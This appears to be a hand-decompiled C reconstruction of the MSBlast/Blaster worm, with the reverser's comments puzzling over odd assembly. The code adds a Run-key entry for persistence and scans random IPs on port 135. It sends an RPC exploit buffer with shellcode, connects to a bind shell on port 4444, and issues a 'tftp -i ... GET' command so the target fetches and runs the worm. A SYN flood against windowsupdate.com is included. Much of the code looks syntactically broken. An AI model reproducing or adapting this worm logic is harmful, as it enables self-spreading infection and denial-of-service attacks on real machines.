
main(int argc, char *argv[])
	{
	WSAData WSAData;
	char name[512];
	in_addr in;
	*hostent_ptr ptr_to_hostent;
	unsigned long passed=0;
	char DateStr[3], MonthStr[3];

	RegCreateKeyExA(0x80000002, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\windows", NULL, NULL, \
			 NULL, 0xF003F, NULL, &keystatus, NULL);

	RegSetValueExA(keystatus, "windows auto update", NULL, (ULONG)1, "msblast.exe", (ULONG) 0x32);
	RegCloseKey(keystatus);

	CreateMutexA(NULL, (ULONG)1, "BILLY");

	if(GetLastError()==0xb7) ExitProcess(0);

	if(WSAStartup(MAKEWORD(2,2), &WSAData) || WSAStartup(MAKEWORD(1,1), &WSAData) \ 
			|| WSAStartup((WORD)1, &WSAData))
		{
		GetModuleFileNameA(NULL, &filename, SIZEOF(filename));
		while (!InternetGetConnectedState(&ThreadID, NULL)) {Sleep(20000);}
		srand(GetTickCount());
		class_a = (rand() % 254)+1;
		class_b = (rand() % 254)+1;
               
        	if((gethostname(&name, 512)!=-1) || (ptr_to_hostent=gethostbyname(&name)))
               		{
               		if((unsigned long)*(ptr_to_hostent.h_list))
               			{
               			memcpy(&in, *(ptr_to_hostent.h_list), 4);
               			sprintf(&name, "%s", inet_ntoa(in.s_addr));
               			t1=atoi(strtok(&name, '.'));
               			t2=atoi(strtok(&name, '.'));
               			t3=atoi(strtok(&name, '.'));
				if (t3>20)
					{
					srand(GetTickCount());
					t3 -= (rand() % 20);
					}
				class_a=t1;
				class_b=t2;
				passed=1;
				}
			}
		srand(GetTickCount());
		if((rand() % 20)>12) passed=0; // this is weird
		unknown_var=1;
		if((rand()%10)>7) unknown_var=2;
		if(!passed)
			{
			t1 = (rand() % 254)+1;
			t2 = (rand() % 254);
			t3 = (rand() % 254);
			}
		GetDateFormatA(0x409, NULL, NULL, "d", &DateStr, 3);
		GetDateFormatA(0x409, NULL, NULL, "d", &MonthStr, 3);
		if((atoi(&DateStr)>15) && (atoi(&MonthStr)>8)) 
			{
			CreateThread(NULL, NULL, &AttackMS, NULL, NULL, ThreadID);
			}
		while(1==1) {ScanAndInfect();}
		WSACleanup();
		}
	return;
}

void send_copy_of_self()
{
	char buf[0x204];
	sockaddr name;
	sockaddr to;
	unsigned long tolen=16, readlen;
	unsigned int var_204, var_202, var_200, i=0;
	FILE *thisfile;
	some_global_var=1;

this_sub_start:

	if((s=socket(2,2,0))==-1) goto this_loc_ret;
	memset(&name, NULL, 0x10);
	name.sa_family=2;
	(unsigned int)name.sa_data=(unsigned int)htons(69);
	if(!(bind(s,&name, 0x10))) goto this_loc_ret;
	if((recvfrom(s,&buf, 0x204,NULL,&from, &fromlen))==-1) goto this_loc_ret;
	if(!(thisfile=fopen(&filename,"rb"))) goto this_loc_ret;

	send_self_loop:

		i++;
		var_204=(unsigned int)htons(3);
		var_202=(unsigned int)htons(i);
		readlen=fread(&var_200, 1, 0x200, thisfile);
		readlen+=4;
		if((sendto(s, &var_204, filelen, NULL, &to))<1) goto fclose_it;
		Sleep(900);
		if(readlen<0x204) goto send_self_loop;
		
		fclose(thisfile);
		goto this_loc_ret;

	fclose_it:	
		if(!((unsigned long)thisfile)) goto this_loc_ret;
		fclose(thisfile);
		goto this_loc_ret;

	goto this_sub_start; // strange, but true

	this_loc_ret:
		closesocket(s);
		ExitThread(0);
return;
}

void inc_tvals()
{
	inc_tvals_start:
	if(t4>254) {t4=0; t3++;}
	else {t4++; return;}
	if(t3>254) {t3=0; t2++;}
	else {t3++; return;}
	if(t2>254) {t2=0; t1++;}
	else {t1++; return;}
	if(t1>254) {t1=0; goto inc_tvals_start;}
}

void ScanAndInfect()
{
	fd_set writefds; // there's actually 64 fds in this array, although only 20 are used.
	in_addr in;
	unsigned long namelen, argp=1, tempvar2, tempvar3;
	sockaddr name;
	socket s[20], currsock;
	timeval timeout;
	memset(&name, 0, 16);
	name.sa_family=(WORD)2;
	name.sa_data=htons(135);
	for(int i=0; i<20; i++) 
		{
		s[i*4]=socket((unsigned long)2, (unsigned long)1, (unsigned long)0);
		if((unsigned long)s[i*4]=-1) return;
		ioctlsocket(s[i*4], 0x8004667e, argp);
		}
	for(int i=0; i<20; i++) 
		{
		inc_tvals();
		sprintf(&cp, "%i.%i.%i.%i", t1, t2, t3, t4);
		tempvar2=inet_addr(&cp);
		if(tempvar2=-1) return;
		(unsigned long)name.sa_data[2]=(unsigned long)tempvar2;
		connect(s[i*4], &name, 16);
		}
	Sleep(1800);
	
	
	for(int i=0; i<20; i++)
		{
		timeout.tv_sec=0; timeout.tv_usec=0; writefds.fd_count=0; tempvar3=0;
		currsock=s[i*4];
		while (tempvar3 < writefds.fd_count)
			{
			if((writefds.fd_array[tempvar3]==currsock)) break;
			tempvar3++;
			}
		if((writefds.fd_count==tempvar3) && (writefds.fd_count>=0x40))
			{
			writefds.fd_array[tempvar3]=currsock;
			writefds.fd_count++;
			}
		if((select(NULL, NULL, &writefds, NULL, &timeout)<1) closesocket(s[i*4]);
		else 
			{
			namelen=10;
			getpeername(s[i*4], &name, &namelen); // ?? doesn't seem to use the result of this call
			infect_host(s[i*4], inet_ntoa(in.s_addr));
			closesocket(s[i*4]);
			}
		}		

	return;
}


int __cdecl infect_host(SOCKET s,char *cp)
{
	
	sockaddr name;
	char fake_sockaddr[0x10], buf[0x370+0x2cc+0x3c], buf2[0x48];
	unsigned long argp=0, returnaddy=0, ipaddyofhosttoinfect, hObject, ThreadID;
        
        /* At this point in the code there's some weirdness.
          
          mov     eax, 2934h
          call    the_code_below
                
	        pop     ecx
	        sub     esp, 1000h
	        sub     eax, 1000h
	        test    [esp], eax
	        cmp     eax, 1000h
	        jnb     short loc_4022B9
	        sub     esp, eax
	        test    [esp], eax
	        jmp     ecx
	        endp
	
	Anyone know what the hell this is?  I'm guessing LCC did not compile this code. */

        
        
        
	ioctlsocket(s,0x8004667e, &argp);
	if(mystery_dword2==1) returnaddy=0x100139d;
	else returnaddy=0x18759f;

	/* memcpy(&buf, &bindcode, 72);
	memcpy(&somestackvar, &request1, 864);
	memcpy(&somestackvar2, &request2, 16);
	memcpy(&somestackvar3, &request3, 60);
	memcpy(&somestackvar4, &sc, 716);
	memcpy(&somestackvar5, &request4, 48); 
	This is unnecessary crap in the code.  I rewrote it below.*/

	memcpy(buf2, bindcode, 0x48);
	memcpy(buf, request1, 0x360);
	memcpy(buf+0x360, request2, 0x10);
	memcpy(buf+0x370, sc, 0x2cc);
	memcpy(buf+0x394, returnaddy, 4);
	(unsigned long *)buf[0x370]+=(unsigned long)0x166;
	(unsigned long *)buf[0x378]+=(unsigned long)0x166;
	memcpy(buf+0x370+0x2cc, request3, 0x3c);
	memcpy(buf+0x370+0x2cc+0x3c, request4, 0x30);
	(unsigned long *)buf[0x8]+=(unsigned long)0x2c0;
	(unsigned long *)buf[0x10]+=(unsigned long)0x2c0;
	(unsigned long *)buf[0x80]+=(unsigned long)0x2c0;
	(unsigned long *)buf[0x84]+=(unsigned long)0x2c0;
	(unsigned long *)buf[0xb4]+=(unsigned long)0x2c0;
	(unsigned long *)buf[0xb8]+=(unsigned long)0x2c0;
	(unsigned long *)buf[0xd0]+=(unsigned long)0x2c0;
	(unsigned long *)buf[0x18c]+=(unsigned long)0x2c0;
        
        if((send(s, &buf2, 0x48, NULL))==-1) goto common_socket_failure;
        if((send(s, &buf, len, NULL))==-1) goto common_socket_failure;
        closesocket(s);
        Sleep(400);
        if((sploit_socket=socket(2, 1, 0))==-1) goto common_socket_failure;
        memset(&name, (unsigned int)0, 0x10);
        name.sa_family=2;
        name.sa_data=(unsigned int)htons(4444);
        if((name.sa_data[2]=(unsigned long)inet_addr(BOX_TO_INFECT))==-1) goto common_socket_failure;
        if((connect(sploit_socket, &name, 0x10))==-1) goto common_socket_failure;
        memset(&ipofsendingbox, (unsigned int)0, 0x10);
        namelen=0x10;
        memset(&fake_sockaddr, (unsigned int)0, 0x10);
        getsockname(sploit_socket, &fake_sockaddr, &namelen);
	sprintf(&ipofsendingbox, "%d.%d.%d.%d", (unsigned short)fake_sockaddr[4],(unsigned short)fake_sockaddr[5],(unsigned short)fake_sockaddr[6],(unsigned short)fake_sockaddr[7]);
        if(s) closesocket(s);
        hObject=CreateThread(NULL, NULL, &send_copy_of_self, NULL, NULL, ThreadID);
        Sleep(80);
        sprintf(&cmdbuffer, "tftp -i %s GET %s\n", &ipofsendingbox, &msblast);
        if((send(sploit_socket, &cmdbuffer, strlen(&cmdbuffer), NULL))<1) goto close_socket;
        Sleep(1000);
	for(int i=0; i<10; i++)
		{
		if (mysterious_dword=0) break;
		else Sleep(2000);
		}
	sprintf(&cmdbuffer, "start %s\n", &msblast);
	if((send(sploit_socket, &cmdbuffer, strlen(&cmdbuffer), NULL))<1) goto close_socket;
        Sleep(2000);
        sprintf(&cmdbuffer, "%s\n", &msblast);
	send(sploit_socket, &cmdbuffer, strlen(&cmdbuffer), NULL);
        Sleep(2000);
        close_socket:
        if(sploit_socket) closesocket(sploit_socket);
        if(mysterious_dword) 
        	{
        	TerminateThread(hObject, NULL);
        	closesocket(s);
        	mysterious_dword=0;
        	}
        if(hObject) CloseHandle(hObject);
        common_socket_failure:
	return;                
}


unsigned int checksum(char *checkdata, unsigned long checklength)
	{
	int j=0;
	unsigned long accum, accum2, accum3;
	unsigned int currword;
	for(i=checklength; i>1; i-=2)
		{
		currword = (unsigned int)checkdata[j];
		accum+=currword;
		j+=2;
		}
	if(i==1) accum+=(unsigned short)checkdata[j+1];
	accum2=accum;
	accum2>>16;
	accum3=accum;
	accum3 &= (unsigned long)0x0000FFFF;
	accum = accum2;
	accum += accum3;
	accum2 = accum;
	accum2 >> 16;
	accum += accum2;
	accum = ~accum;
	accum &= (unsigned long)0x0000ffff;
	return accum;
	}

int __cdecl GetIpAddy(char *name)
{
	unsigned long E_AX;
	E_AX=(unsigned long)inet_addr(name);
	if (E_AX!=-1) return E_AX;
	E_AX=(unsigned long)gethostbyname(name);
	if (E_AX==-1) return E_AX;
	E_AX=(unsigned long)*(*(*(E_AX+12)));
	return E_AX;
}

unsigned long __stdcall AttackMS(LPVOID)
{
	unsigned long ipaddrms, socketms, sockoptsretval, optval=1;
	
	ipaddrms=(unsigned long)GetIPAddy("windowsupdate.com");
	
	socketms=WSASocketA(2,3,0xff,NULL,NULL,1); if (socketms==-1) return;
	
	sockoptsretval=setsockopt(E_BX, NULL, 2, &optval, (unsigned long)4); if (sockoptsretval==-1) return;
	
	while(1==1) {build_and_send_packets(ipaddrms, socketms);  Sleep(20);}
	
	closesocket(socketms);
	return;
}
	
void build_and_send_packets(unsigned long msipaddr, socket s)
{
	char buf1[0xc];
	char buf[0x64];
	sockaddr to;
	char name[0x10];
	
	memset(&buf,0,60);
	srand(GetTickCount());
	sprintf(&name, "%i.%i.%i.%i", class_a, class_b, rand()%255, rand()%255);
	GetIPAddy(&name);
	to.sa_family=2;                
	to.sa_data=(unsigned int)htons(0x50);
	memcpy(&to.sa_data+2,&msipaddr,4);
	buf[0x50]=(unsigned short)0x45;        
	buf[0x52]=(unsigned int)htons(0x28);
	buf[0x54]=(unsigned int)1;
	buf[0x56]=(unsigned int)0;
	buf[0x58]=(unsigned short)0x80;
	buf[0x59]=(unsigned short)6;
	buf[0x5a]=(unsigned int)0;
	buf[0x60]=(unsigned long)msipaddr;
	buf[0x3e]=(unsigned int)htons(0x50);
	buf[0x44]=(unsigned long)0;
	buf[0x46]=(unsigned short)0x50;
	buf[0x47]=(unsigned short)2;
	buf[0x48]=(unsigned int)htons(0x4000);
	buf[0x4a]=(unsigned int)0;
	buf[0x4c]=(unsigned int)0;
	buf1[4]=(unsigned long)msipaddr;
	buf1[8]=(unsigned short)0;
	buf1[9]=(unsigned short)0;
	buf1[10]=(unsigned int)htons(0x14);
	buf[0x5c]=(unsigned long)msipaddr;
	buf[0x3c]=(unsigned int)htons((rand() % 1000)+1000);
	var_9c=rand();
	var_9c<<16;
	var_9c |= rand();
	var_9c &= (unsigned long)0x0000FFFF;
	buf[0x40]=(unsigned int)htons(var_9c);
	buf1[0]=msipaddr;
	memcpy(&buf, &buf1, 0xc);
	memcpy(&buf[8], &buf[0x38], 0x14);
	buf[0x4c]=(unsigned int)checksum(&buf, 0x20);
	memcpy(&buf, &buf[0x50], 0x14);
	memcpy(&buf[0x14], &buf[0x3c], 0x14);
	memset(&buf[0x28], (unsigned int) 0, 4);
	buf[0x5a]=(unsigned int)checksum(&buf, 0x28);
	memcpy(&buf, &buf[0x50], 0x14);

	// again, anyone know what kind of packets these are?

	sendto(s, &buf, 0x28, NULL, &to, 0x10);
}                
